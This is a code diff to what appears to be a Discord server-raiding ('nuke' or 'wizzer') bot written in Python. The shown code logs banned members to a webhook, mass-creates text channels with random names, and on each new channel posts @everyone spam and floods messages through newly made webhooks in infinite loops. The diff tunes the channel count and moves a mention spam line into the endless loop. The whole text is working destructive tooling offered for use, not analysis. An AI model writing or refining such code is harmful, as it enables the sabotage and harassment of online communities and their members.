@@ -54,7 +54,7 @@ async def nuke(guild):
   log.add_embed_field(name = "Members Banned", value = f"{guild.bans}", inline = False)
   webhook.add_embed(log)
   webhook.execute()
-  for i in range(200):
+  for i in range(150):
     await guild.create_text_channel(random.choice(CHANNEL_NAMES))
   print(f"{C.GREEN}Nuked {guild.name} ~ Using 1337 wizzer.")
 
@@ -223,13 +223,13 @@ async def force_restart(ctx):
 
 @bot.event
 async def on_guild_channel_create(channel):
-  while True:
     await channel.send("@everyone 1337 Wizzed This Shit.")
     webhook = await channel.create_webhook(name="1337")
     webhook_url = webhook.url
     async with aiohttp.ClientSession() as session:
       webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
       while True:
+        await channel.send("@everyone 1337 Wizzed This Shit.")
         await webhook.send(random.choice(spam_messages), username = random.choice(webhook_usernames))
 
 @bot.event
